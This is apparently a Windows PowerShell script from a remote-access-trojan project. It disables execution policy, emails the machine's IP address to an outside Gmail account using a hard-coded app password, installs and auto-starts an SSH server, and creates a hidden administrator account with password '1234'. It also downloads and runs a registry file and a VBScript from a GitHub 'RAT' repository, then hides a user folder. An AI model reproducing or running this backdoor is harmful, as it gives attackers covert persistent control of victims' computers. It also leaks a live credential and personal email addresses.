
Get-ExecutionPolicy -List

Set-ExecutionPolicy Bypass

Get-ExecutionPolicy -List




# Define sender, recipient, subject, and body
$from = "firas.riahi@ensi-uma.tn"
$to = "riahifiras08@gmail.com"
$subject = "Test Email"
$ipConfigOutput = ipconfig
$ip = $ipConfigOutput | Select-String -Pattern 'Adresse IPv4.*: ((\d{1,3}\.){3}\d{1,3})' | ForEach-Object { $_.Matches.Groups[1].Value }

# If IPv4 address is found, proceed with sending the email
if ($ip) {
    $body = "This is a test email sent via PowerShell, ched addresset ip: $ip :D ."
    # Send the email here
} else {
    $body = "IPv4 address not found."
}

# Gmail SMTP server settings
$smtpServer = "smtp.gmail.com"
$smtpPort = 587
$username = "firas.riahi@ensi-uma.tn"
$password = "ijrw kynq kdsm tjki " # Or your app password if you have two-factor authentication enabled

# Create the email object
$email = New-Object System.Net.Mail.MailMessage
$email.From = $from
$email.To.Add($to)
$email.Subject = $subject
$email.Body = $body

# Create SMTP client and send the email
$smtp = New-Object System.Net.Mail.SmtpClient($smtpServer, $smtpPort)
$smtp.EnableSSL = $true
$smtp.Credentials = New-Object System.Net.NetworkCredential($username, $password)

# Send the email
$smtp.Send($email)

Write-Host "Email sent successfully."





# Install the OpenSSH Client
Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0

# Install the OpenSSH Server
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0


# Start the sshd service
Start-Service sshd

# OPTIONAL but recommended:
Set-Service -Name sshd -StartupType 'Automatic'

# Confirm the Firewall rule is configured. It should be created automatically by setup. Run the following to verify
if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue | Select-Object Name, Enabled)) {
    Write-Output "Firewall Rule 'OpenSSH-Server-In-TCP' does not exist, creating it..."
    New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
} else {
    Write-Output "Firewall rule 'OpenSSH-Server-In-TCP' has been created and exists."
}



 New-LocalUser -Name "jarbouu3" -Password (ConvertTo-SecureString "1234" -AsPlainText -Force) -FullName "dummy xd" -Description "idk"


net user Broo test 

net localgroup Administrateurs jarbouu3 /add 


Invoke-WebRequest -Uri https://raw.githubusercontent.com/riahifiras/RAT/main/files/wreg.reg -OutFile "wreg.reg"


Invoke-WebRequest -Uri https://raw.githubusercontent.com/riahifiras/RAT/main/files/hello.vbs -OutFile "hello.vbs"


.\wreg.reg; .\hello 

cd C:\Users
attrib +h +s +r Broo


Restart-Service sshd

exit

